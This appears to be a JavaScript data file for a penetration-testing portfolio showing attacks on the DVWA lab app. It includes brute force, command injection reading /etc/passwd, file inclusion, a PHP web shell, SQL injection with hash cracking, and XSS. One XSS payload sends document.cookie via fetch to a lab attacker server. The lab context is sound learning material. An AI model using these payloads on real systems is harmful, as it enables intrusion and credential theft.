const modules = [
  {
    id: "brute-force",
    title: "Brute Force",
    type: "Authentication",
    severity: "Medium",
    overview: "Burp Suite Intruder Cluster Bomb was performed on the login request. The username and password parameters were selected as payload positions, and the valid result was identified from the different response length.",
    vulnerable: "The login function allows repeated credential testing without strong protection.",
    steps: [
      "Captured the DVWA login request in Burp Suite.",
      "Selected username and password as payload positions.",
      "Used Cluster Bomb to test both payload lists together.",
      "Checked status code and response length to identify the successful login."
    ],
    payloads: [
      {
        label: "Burp Intruder Setup",
        code: "Attack type: Cluster Bomb\nPosition 1: username\nPosition 2: password"
      }
    ],
    images: [
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/brute-force/01-captured-request.png", "Captured login request", "Captured the DVWA login request in Burp Suite to analyze parameters"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/brute-force/02-attack-type.png", "Cluster Bomb attack type selected", "Attack type: Cluster Bomb — tests all combinations of username and password payloads"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/brute-force/03-payload-positions.png", "Username and password payload positions", "Payload positions set on username and password parameters"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/brute-force/04-payload-list.png", "Payload list configured", "Separate payload lists configured for each position"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/brute-force/05-result.png", "Intruder attack result", "Intruder results sorted — valid credentials identified by different response length"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/brute-force/06-length-difference.png", "Different length showing valid response", "Valid login response has different content length than failed attempts"]
    ]
  },
  {
    id: "command-injection",
    title: "Command Injection",
    type: "Server-Side Injection",
    severity: "High",
    overview: "Command injection was tested through the Ping a device input field. Different command separators were used in Low, Medium, and High security levels to execute extra system commands.",
    vulnerable: "The application places user input inside a system command without strict validation.",
    steps: [
      "Entered payloads in the ping input field.",
      "Low security allowed direct command chaining with semicolon.",
      "Medium security was bypassed using single ampersand.",
      "High security was bypassed using pipe without space."
    ],
    payloads: [
      { label: "Low Security", code: "127.0.0.1; cat /etc/passwd" },
      { label: "Medium Security", code: "127.0.0.1 & cat /etc/passwd" },
      { label: "High Security", code: "127.0.0.1|ls" }
    ],
    images: [
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/command-injection/01-low-result.png", "Low security command injection result", "Payload: 127.0.0.1; cat /etc/passwd — semicolon chains a second command, dumping /etc/passwd"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/command-injection/02-medium-source.png", "Medium security source code blacklist", "Source code blacklists && and ; but single & operator is not filtered"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/command-injection/03-medium-bypass.png", "Medium security bypass result", "Payload: 127.0.0.1 & cat /etc/passwd — single ampersand bypasses the blacklist"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/command-injection/04-high-source.png", "High security source code bypass point", "Payload: 127.0.0.1|ls — pipe without space bypasses high security filters"]
    ]
  },
  {
    id: "csrf",
    title: "Cross-Site Request Forgery",
    type: "Session Attack",
    severity: "Medium",
    overview: "The password change function was tested using a crafted URL request while the user session was active. After execution, the old password no longer worked.",
    vulnerable: "The password change action accepts a predictable request without strong CSRF protection.",
    steps: [
      "Created a password change request URL.",
      "Executed the request while logged in.",
      "Confirmed that the password was changed.",
      "Verified that the old password failed after the request."
    ],
    payloads: [
      { label: "Password Change Request", code: "http://localhost/DVWA/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change" }
    ],
    images: [
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/csrf/01-request.png", "Captured CSRF request", "Crafted URL: /vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/csrf/02-valid-password.png", "Valid login before change", "Password change executed successfully while user session was active"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/csrf/03-wrong-password.png", "Old password failed after change", "Old password no longer works — confirms CSRF attack changed the credentials"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/csrf/04-after.png", "CSRF verification evidence", "New password 'password' now works — CSRF vulnerability confirmed"]
    ]
  },
  {
    id: "file-inclusion",
    title: "File Inclusion",
    type: "File Handling",
    severity: "High",
    overview: "File inclusion was tested through the page parameter. Local file inclusion, remote file inclusion, medium bypass, and high security file:// bypass were demonstrated.",
    vulnerable: "The page parameter loads user-controlled file paths instead of using a strict allow-list.",
    steps: [
      "Loaded the normal page using page=file1.php.",
      "Used directory traversal to read /etc/passwd.",
      "Tested remote URL inclusion.",
      "Bypassed High security with file:///etc/passwd."
    ],
    payloads: [
      { label: "Normal File", code: "http://localhost/DVWA/vulnerabilities/fi/?page=file1.php" },
      { label: "Low Security LFI", code: "http://localhost/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd" },
      { label: "Remote File Inclusion", code: "http://localhost/DVWA/vulnerabilities/fi/?page=https://google.com" },
      { label: "Medium Security Bypass", code: "http://localhost/DVWA/vulnerabilities/fi/?page=..././..././..././..././..././..././etc/passwd" },
      { label: "High Security Bypass", code: "http://localhost/DVWA/vulnerabilities/fi/?page=file:///etc/passwd" }
    ],
    images: [
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/file-inclusion/01-normal-page.png", "Normal file inclusion page", "Normal: ?page=file1.php — application loads files based on user-supplied parameter"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/file-inclusion/02-lfi-passwd.png", "Local file inclusion reading /etc/passwd", "LFI Payload: ?page=../../../../../../etc/passwd — directory traversal reads system files"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/file-inclusion/03-rfi-google.png", "Remote file inclusion test", "RFI Payload: ?page=https://google.com — external URL loaded inside the application"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/file-inclusion/04-medium-bypass.png", "Medium security bypass", "Medium Bypass: ?page=..././..././etc/passwd — double traversal bypasses ../ stripping"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/file-inclusion/05-high-source.png", "High security source code", "High security checks if page starts with 'file' — but file:// protocol is still allowed"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/file-inclusion/06-high-file-bypass.png", "High security file:// bypass", "High Bypass: ?page=file:///etc/passwd — file:// protocol reads local files"]
    ]
  },
  {
    id: "file-upload",
    title: "File Upload",
    type: "File Handling",
    severity: "Critical",
    overview: "A PHP shell file was uploaded through the image upload option and then accessed from the browser to execute commands using the cmd parameter.",
    vulnerable: "The upload function accepts executable PHP files and stores them in a web-accessible location.",
    steps: [
      "Created shell.php with a command execution parameter.",
      "Uploaded the file through DVWA File Upload.",
      "Opened the uploaded file from the browser.",
      "Executed pwd and ls commands through the URL."
    ],
    payloads: [
      { label: "PHP Shell", code: "<?php echo shell_exec($_GET[\"cmd\"]); ?>" },
      { label: "Open Shell", code: "http://localhost/DVWA/hackable/uploads/shell.php?cmd=pwd" },
      { label: "List Files", code: "http://localhost/DVWA/hackable/uploads/shell.php?cmd=ls" },
      { label: "Root Directory List", code: "http://localhost/DVWA/hackable/uploads/shell.php?cmd=cd%20/;%20ls" }
    ],
    images: [
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/file-upload/01-shell-code.png", "PHP shell source code", "Shell file: <?php echo shell_exec($_GET['cmd']); ?> — executes any command via URL"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/file-upload/02-upload-success.png", "shell.php uploaded successfully", "File uploaded to: ../../hackable/uploads/shell.php — stored in web-accessible directory"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/file-upload/03-pwd-result.png", "pwd command execution", "URL: shell.php?cmd=pwd — returns current working directory on the server"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/file-upload/04-ls-result.png", "ls command execution", "URL: shell.php?cmd=cd /; ls — lists root directory, proving full RCE"]
    ]
  },
  {
    id: "sql-injection",
    title: "SQL Injection",
    type: "Database Attack",
    severity: "Critical",
    overview: "SQL injection was tested through the user ID input field. UNION-based payloads were used to show databases, tables, columns, and user password hashes.",
    vulnerable: "User input is inserted into the SQL query without prepared statements.",
    steps: [
      "Used UNION SELECT to enumerate database names.",
      "Read table names from the dvwa database.",
      "Extracted column names from the users table.",
      "Retrieved usernames and password hashes, then cracked hashes using Hashcat."
    ],
    payloads: [
      { label: "Show Databases", code: "-1' UNION SELECT 1, schema_name FROM information_schema.schemata #" },
      { label: "Show Tables", code: "-1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa' #" },
      { label: "Show Columns", code: "1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #" },
      { label: "Read Users and Passwords", code: "1' UNION SELECT user, password FROM users #" },
      { label: "Hashcat", code: "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 0 hash.txt --show" }
    ],
    images: [
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/sql-injection/01-show-databases.png", "Database enumeration", "Payload: -1' UNION SELECT 1, schema_name FROM information_schema.schemata #"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/sql-injection/02-query-explanation.png", "SQL payload explanation", "UNION-based injection extracts data from information_schema"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/sql-injection/03-show-tables.png", "Table enumeration", "Payload: -1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa' #"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/sql-injection/04-show-columns.png", "Column enumeration", "Payload: 1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/sql-injection/05-read-users-passwords.png", "User and password hash extraction", "Payload: 1' UNION SELECT user, password FROM users # — extracts credentials"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/sql-injection/06-hash-cracking.png", "Hash cracking result", "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt — MD5 hashes cracked"]
    ]
  },
  {
    id: "dom-xss",
    title: "DOM-Based XSS",
    type: "Client-Side Attack",
    severity: "Medium",
    overview: "DOM-based XSS was tested through the URL parameter used by the page JavaScript. The payload executed inside the browser.",
    vulnerable: "Client-side script writes URL input into the page without proper encoding.",
    steps: [
      "Placed the script payload in the default parameter.",
      "Loaded the modified URL in the browser.",
      "Confirmed execution through the alert popup."
    ],
    payloads: [
      { label: "DOM XSS Payload", code: "default=<script>alert('XSS DOM')</script>" }
    ],
    images: [
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/dom-xss/01-payload.png", "DOM XSS payload in URL", "Payload: default=<script>alert('XSS DOM')</script> — injected via URL parameter"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/dom-xss/02-alert.png", "DOM XSS alert result", "Result: JavaScript alert executed — confirms DOM-Based XSS vulnerability"]
    ]
  },
  {
    id: "reflected-xss",
    title: "Reflected XSS",
    type: "Client-Side Attack",
    severity: "High",
    overview: "Reflected XSS was tested through an input field where submitted data was returned in the page response and executed by the browser.",
    vulnerable: "User input is reflected into the response without sanitization or output encoding.",
    steps: [
      "Submitted JavaScript in the input field.",
      "The page reflected the payload in the response.",
      "The browser executed the script and displayed cookie data."
    ],
    payloads: [
      { label: "Basic Alert", code: "<script>alert(0)</script>" },
      { label: "Cookie Alert", code: "<script>alert(document.cookie)</script>" }
    ],
    images: [
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/reflected-xss/01-payload.png", "Reflected XSS payload", "Payload: <script>alert(document.cookie)</script> — injected in the input field"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/reflected-xss/02-cookie-alert.png", "Cookie alert result", "Result: Session cookie displayed — sensitive browser data accessible via reflected XSS"]
    ]
  },
  {
    id: "stored-xss",
    title: "Stored XSS",
    type: "Client-Side Attack",
    severity: "High",
    overview: "Stored XSS was tested through the message field. The payload was saved by the application and executed again whenever the stored message loaded.",
    vulnerable: "Stored user input is displayed later without sanitization or output encoding.",
    steps: [
      "Submitted the XSS payload in the message field.",
      "The application stored the payload.",
      "The script executed automatically when the message was displayed."
    ],
    payloads: [
      { label: "Stored Cookie Alert", code: "<script>alert(document.cookie)</script>" }
    ],
    images: [
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/stored-xss/01-message.png", "Stored XSS message", "Payload: <script>alert(document.cookie)</script> — submitted in message field and stored"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/stored-xss/02-execution.png", "Stored XSS execution", "Result: Stored payload executes on page load — cookie alert fires on every visit"]
    ]
  },
  {
    id: "cookie-stealing",
    title: "Cookie Stealing Using XSS",
    type: "Client-Side Attack",
    severity: "High",
    overview: "A Python HTTP server was created on the lab attacker machine, and an XSS payload sent the browser cookie to that server.",
    vulnerable: "The page executes user-supplied JavaScript, allowing document.cookie to be read inside the browser.",
    steps: [
      "Started a Python HTTP server on port 8000.",
      "Injected a fetch payload that sends document.cookie to the listener.",
      "Confirmed the cookie value in the HTTP server log."
    ],
    payloads: [
      { label: "Create Server", code: "python3 -m http.server 8000" },
      { label: "Cookie Capture Payload", code: "<script>fetch(\"http://192.168.220.128:8000/?cookie=\" + document.cookie)</script>" }
    ],
    images: [
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/cookie-stealing/01-server.png", "Python HTTP server started", "Attacker server: python3 -m http.server 8000 — listening for incoming cookie data"],
      ["https://safayet19.github.io/Pen-Test/dvwa-showcase/assets/screenshots/cookie-stealing/02-cookie-log.png", "Cookie received in server log", "Result: Victim's cookie captured in HTTP request log — <script>fetch('...?cookie=' + document.cookie)</script>"]
    ]
  }
];
